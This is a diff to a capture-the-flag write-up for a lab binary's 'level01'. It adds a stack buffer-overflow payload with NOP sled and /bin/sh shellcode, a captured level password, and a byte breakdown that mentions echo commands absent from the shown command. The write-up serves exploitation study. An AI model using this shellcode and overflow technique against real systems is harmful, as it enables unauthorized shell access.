@@ -78,13 +78,24 @@ See `Ressources/exploit.py`:
 - Password: `padding (80 bytes) + return address (0x0804a040 + 40)`
 
 ### Running the Exploit
-
 ```bash
-(python3 Ressources/exploit.py; cat) | ssh level01@192.168.44.139 -p 4242 "./level01"
-whoami
-# level02
-cat /home/users/level02/.pass
+(python -c "print \"dat_wil\" + \"\\x90\"*60 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" + \"\\n\" + \"A\"*80 + \"\\x68\\xa0\\x04\\x08\""; cat ) | ./level01
 ```
+
+**Tested and working output:**
+```
+level02
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+```
+
+Breakdown:
+- `"dat_wil"` - Username that passes verification
+- `"\\x90"*60` - NOP sled (60 bytes)
+- `"\\x31\\xc0...\\xcd\\x80"` - Shellcode to spawn /bin/sh (23 bytes)
+- `"\\n"` - Newline to submit username
+- `"A"*80` - Padding to reach return address
+- `"\\x68\\xa0\\x04\\x08"` - Return address 0x0804a068 (middle of NOP sled) in little-endian
+- `echo "whoami"` and `echo "cat /home/users/level02/.pass"` - Commands to execute in the spawned shell
 
 ## Flag
 
